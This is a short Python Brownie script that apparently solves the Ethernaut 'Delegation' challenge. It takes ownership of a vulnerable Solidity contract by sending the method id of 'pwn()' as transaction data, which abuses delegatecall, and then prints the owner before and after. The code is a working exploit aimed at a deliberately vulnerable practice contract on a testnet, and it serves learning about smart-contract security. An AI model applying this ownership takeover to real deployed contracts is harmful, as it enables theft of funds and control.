#!/usr/bin/python3
from brownie import Delegation, web3
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET
# * Rinkeby address: 0x8102107b35800DC16f05B7aB94551246b8059cd9


def delegation(contract_address=None, attacker=None):
    if not contract_address:
        delegate_contract, delegation_contract, _ = deploy()
        _, attacker = get_account()
    else:
        delegation_contract = Delegation.at(contract_address)

    prev_owner = delegation_contract.owner()
    data = web3.keccak(text="pwn()")
    # print(data)
    # * Attack the contract by sending the name of the fn. bcz. of solidity uses `method ids` to identify the methods
    # * send data to the contract from attacker
    attacker.transfer(to=delegation_contract, data=data)

    print(f"{green}Previous Owner: {blue}{prev_owner}{reset}")
    print(f"{green} Attacker: {red}{attacker}{reset}")
    print(f"{green}New Owner: {red}{delegation_contract.owner()}{reset}")


def main(contract_address=None):
    if contract_address:
        delegation(contract_address, get_account())
    else:
        delegation(None)


if __name__ == "__main__":
    main()
